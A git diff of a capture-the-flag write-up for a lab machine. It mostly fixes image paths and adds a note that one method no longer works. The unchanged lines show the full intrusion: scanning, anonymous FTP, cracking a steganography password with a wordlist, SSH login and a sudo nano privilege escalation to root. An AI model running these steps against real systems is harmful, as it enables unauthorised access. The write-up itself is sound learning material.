@@ -9,7 +9,7 @@ nmap -sC -sV -p- 10.48.160.254
 gobuster dir -u http://10.48.160.254 -w dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
 
-![enum result](Assets/134.png)
+![enum result](../NPT/Assets/134.png)
 
 We found FTP port open, so let us try anonymous login
 
@@ -19,7 +19,7 @@ ftp 10.48.160.254
 
 Username and Password both are : anonymous
 
-![enum result](Assets/136.png)
+![enum result](../NPT/Assets/136.png)
 
 We found a file called note_to_jake.txt, let us transfer this file in our system
 
@@ -35,11 +35,11 @@ cat get note_to_jake.txt
 
 Found a username called Jake
 
-![enum result](Assets/137.png)
+![enum result](../NPT/Assets/137.png)
 
 Now if we go to the IP in website, Right Click -> View page source
 
-![enum result](Assets/138.png)
+![enum result](../NPT/Assets/138.png)
 
 We found a clue that we can use steganography and also got a link for a url
 
@@ -63,7 +63,7 @@ stegcracker Downloads/brooklyn99.jpg rockyou.txt
 cat Downloads/brooklyn99.jpg.out
 ```
 
-![enum result](Assets/140.png)
+![enum result](../NPT/Assets/140.png)
 
 ```
 fluffydog12@ninenine
@@ -93,7 +93,7 @@ Now we will do ssh login
 ssh jake@10.48.160.254
 ```
 
-![enum result](Assets/141.png)
+![enum result](../NPT/Assets/141.png)
 
 ```
 find / -name user.txt 2>/dev/null
@@ -117,7 +117,7 @@ Enter password we got
 cat /home/holt/user.txt
 ```
 
-![enum result](Assets/142.png)
+![enum result](../NPT/Assets/142.png)
 
 ```
 sudo -l
@@ -131,7 +131,7 @@ https://gtfobins.org/gtfobins/nano/
 cd /usr/bin
 ```
 
-![enum result](Assets/144.png)
+![enum result](../NPT/Assets/144.png)
 
 ```
 less /root/root.txt
@@ -140,6 +140,8 @@ less /root/root.txt
 ![enum result](Assets/145.png)
 
 ## Method-2
+
+This method wont' work now as there is some problem with nano bin so its better to try one with user jake which has jake
 
 Now will do this one inside holt
 
@@ -165,8 +167,7 @@ nano -s /bin/sh
 
 Do CTRL+ T to save it and now we are root
 
-![enum result](Assets/146.png)
-
+![enum result](../NPT/Assets/146.png)
 
 
 
